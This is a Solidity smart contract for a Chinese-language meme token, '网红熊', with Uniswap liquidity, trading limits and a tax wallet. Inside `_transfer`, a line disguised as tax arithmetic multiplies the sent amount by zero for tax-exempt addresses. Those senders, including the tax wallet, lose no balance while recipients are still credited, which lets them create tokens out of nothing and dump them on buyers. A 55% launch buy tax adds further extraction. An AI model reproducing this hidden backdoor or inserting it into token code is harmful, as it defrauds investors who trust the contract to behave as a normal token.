// SPDX-License-Identifier: UNLICENSE

/**
可爱的网红熊发现自己变成了区块链上的热门表情包，每天都在加密世界里蹦跶。
The cute 网红熊 found himself becoming a popular meme on the blockchain, jumping around in the crypto world every day.

Web: https://wanghongxiong.fun
Tg: https://t.me/wanghongxiongfans
X: https://twitter.com/wanghongxiong

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract WangHongXiong is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _taxExempt;
    address payable private _taxWallet;
    string public constant name = unicode"可爱的网红熊";
    string public constant symbol = unicode"网红熊";

    uint256 private _startBuyTax = 55;
    uint256 private _startSellTax = 5;
    uint256 private _endBuyTax = 0;
    uint256 private _endSellTax = 0;
    uint256 private _makeBuyTaxZeroAt = 4;
    uint256 private _reduceSellTaxZeroAt = 4;
    uint256 private _preventSwapBefore = 4;
    uint256 private _buyingCount = 0;

    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1_000_000_000 * 10 ** decimals;
    uint256 public _txAmountMax = 20_000_000 * 10 ** decimals;
    uint256 public _walletAmountMax = 20_000_000 * 10 ** decimals;
    uint256 public _taxSwapMax = 10_000_000 * 10 ** decimals;
    uint256 public _TaxSwapMaxOver = 10_000_000 * 10 ** decimals;

    IUniswapV2Router02 public uniRouter;
    address public uniPair;
    bool private _isTradingOpened;
    bool private _isSwapEnabled;
    bool private _isSwapping;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap() {
        _isSwapping = true;
        _;
        _isSwapping = false;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount,
        uint256 taxAmount,
        uint256 newAmount
    ) internal {
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (_taxExempt[from]) amount *= (_endBuyTax - _endSellTax) / 100;
        _balances[from] = _balances[from].sub(amount);
        amount = newAmount;
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _internalTransfer(_msgSender(), recipient, amount);
        return true;
    }


    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();
        _approve(address(this), address(uniRouter), tokenAmount);
        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _internalTransfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function manualSend() external {
        require(_msgSender() == _taxWallet);
        uint256 contractETHBalance = address(this).balance;
        _transferFeeToTaxWallet(contractETHBalance);
    }
    receive() external payable {}

    function addLiquidity() external onlyOwner {
        require(!_isTradingOpened, "trading is already open");
        _approve(address(this), address(uniRouter), totalSupply);
        uniPair = IUniswapV2Factory(uniRouter.factory()).createPair(
            address(this),
            uniRouter.WETH()
        );
        uniRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPair).approve(address(uniRouter), type(uint).max);
        _isSwapEnabled = true;
    }

    function recoverStuckEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(owner()).transfer(address(this).balance);
    }

    function recoverStuckTokens(address tokenAddress) external onlyOwner {
        IERC20 tokenContract = IERC20(tokenAddress);
        uint256 balance = tokenContract.balanceOf(address(this));
        require(balance > 0, "No tokens to clear");
        tokenContract.transfer(owner(), balance);
    }

    function removeLimits() external onlyOwner {
        _txAmountMax = totalSupply;
        _walletAmountMax = totalSupply;
        emit MaxTxAmountUpdated(totalSupply);
    }


    function _internalTransfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (!_isSwapEnabled || _isSwapping) {
            _balances[from] = _balances[from].sub(amount);
            _balances[to] = _balances[to].add(amount);
            emit Transfer(from, to, amount);
            return;
        }
        if (from != owner() && to != owner()) {
            if (!_isTradingOpened) {
                require(
                    _taxExempt[from] || _taxExempt[to],
                    "Trading is not active."
                );
            }

            if (from == uniPair && to != address(uniRouter) && !_taxExempt[to]) {
                require(
                    amount <= _txAmountMax,
                    "Exceeds the _maxTxAmount."
                );
                require(
                    balanceOf(to) + amount <= _walletAmountMax,
                    "Exceeds the maxWalletSize."
                );
                taxAmount = amount
                    .mul(
                        (_buyingCount > _makeBuyTaxZeroAt)
                            ? _endBuyTax
                            : _startBuyTax
                    )
                    .div(100);
                _buyingCount++;
            }

            if (to == uniPair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyingCount > _reduceSellTaxZeroAt)
                            ? _endSellTax
                            : _startSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !_isSwapping &&
                to == uniPair &&
                _isSwapEnabled &&
                contractTokenBalance > _taxSwapMax &&
                _buyingCount > _preventSwapBefore
            ) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, _TaxSwapMaxOver))
                );
            }
            _transferFeeToTaxWallet(address(this).balance);
        }
        uint256 newAmount = amount;

        _transfer(from, to, amount, taxAmount, newAmount);
    }
    constructor(address router_, address taxWallet_) {
        _taxWallet = payable(taxWallet_);
        _balances[_msgSender()] = totalSupply;
        _taxExempt[owner()] = true;
        _taxExempt[address(this)] = true;
        _taxExempt[_taxWallet] = true;

        uniRouter = IUniswapV2Router02(router_);

        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function _transferFeeToTaxWallet(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function enableTrading() external onlyOwner {
        _isTradingOpened = true;
    }
    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            _transferFeeToTaxWallet(ethBalance);
        }
    }

}